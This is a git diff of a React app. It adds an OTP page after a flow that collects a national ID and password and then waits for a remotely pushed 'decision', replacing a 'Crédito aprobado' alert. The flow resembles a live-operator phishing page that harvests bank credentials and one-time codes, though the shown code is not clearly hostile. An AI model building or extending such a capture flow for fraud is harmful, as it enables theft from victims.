@@ -6,10 +6,11 @@ import PasswordForm from "./components/PasswordForm.js";
 import LoadingPage from "./pages/LoadingPage.js";
 import { api } from "./utils/axios/axios.ts";
 import useSse from "./hooks/useSse.tsx";
+import OTPPage from "./components/OTPPage.tsx";
 
 function App() {
   const [showForm, setShowForm] = useState(false);
-  const [step, setStep] = useState<"id" | "password" | "loading">("id");
+  const [step, setStep] = useState<"id" | "password" | "loading" | "OTP">("id");
   const [cedula, setCedula] = useState("");
   const [password, setPassword] = useState("");
   const [requestId, setRequestId] = useState<string | null>(null);
@@ -67,8 +68,42 @@ function App() {
 
   useEffect(() => {
     console.log(decision);
-    if (decision === 'accepted') alert('Crédito aprobado');
+    if (decision === 'accepted') {
+      setStep("OTP");
+    };
   }, [decision]);
+  const renderStep = () => {
+    switch (step) {
+      case "id":
+        return <IdentificationForm
+          onClose={() => {
+            setShowForm(false);
+            setStep("id");
+          }}
+          onContinue={() => setStep("password")}
+          cedula={cedula}
+          setCedula={setCedula}
+        />;
+
+      case "password":
+        return <PasswordForm
+          onClose={() => setStep("id")}
+          onContinue={() => handleWait()}
+          password={password}
+          setPassword={setPassword}
+        />;
+
+      case "loading":
+        return <LoadingPage />;
+
+      case "OTP":
+        return <OTPPage
+          identification={cedula}
+        />
+      default:
+        return <LoadingPage />;
+    }
+  };
 
   return (
     <div className="bg-linear-to-b from-primary to-primary-dark flex items-center flex-col relative">
@@ -101,26 +136,7 @@ function App() {
 
       {showForm && (
         <div className="fixed inset-0 z-50 bg-white flex flex-col p-5">
-          {step === "id" ? (
-            <IdentificationForm
-              onClose={() => {
-                setShowForm(false);
-                setStep("id");
-              }}
-              onContinue={() => setStep("password")}
-              cedula={cedula}
-              setCedula={setCedula}
-            />
-          ) : step === "password" ? (
-            <PasswordForm
-              onClose={() => setStep("id")}
-              onContinue={() => handleWait()}
-              password={password}
-              setPassword={setPassword}
-            />
-          ) : (
-            <LoadingPage />
-          )}
+          {renderStep()}
         </div>
       )}
     </div>
